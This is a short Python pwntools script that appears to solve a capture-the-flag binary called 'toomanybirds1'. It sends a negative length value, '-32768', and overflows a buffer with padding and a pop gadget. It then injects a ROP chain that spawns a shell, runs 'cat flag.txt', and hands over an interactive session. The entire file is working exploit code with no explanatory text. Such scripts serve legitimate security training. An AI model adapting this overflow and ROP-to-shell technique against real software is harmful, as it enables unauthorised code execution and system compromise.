from pwn import * 
from struct import pack
import sys
from ropTool import *

rop = ropTool('toomanybirds1')
gadget = rop.getGadget()
rop.getDataSection()
c,pl = rop.getShell()


i=7#8+8+8+2+8
if len(sys.argv)>1:
	i=int(sys.argv[1])

p = b'aaaaaaa'#*i

p += pl

print("===========Chain=======")
for i in c:
	print(i)
# print(pl)

# payload += pl
used_gadget = rop.getUsedGadget()
print("===========Used Gadget=======")
for u in used_gadget:
	print(u)
print("===========Payload=======")			
print(pl)


p += b'a'*(511 - len(p))

# popping to reach buffer
p += p64(0x40351e) 	# pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret

# making input large enough
p += b'\x00'*(65536)

#print(p)

P = process('./toomanybirds1')

P.sendline(b'-32768')
P.sendline(p)
P.sendline("cat flag.txt")
P.interactive()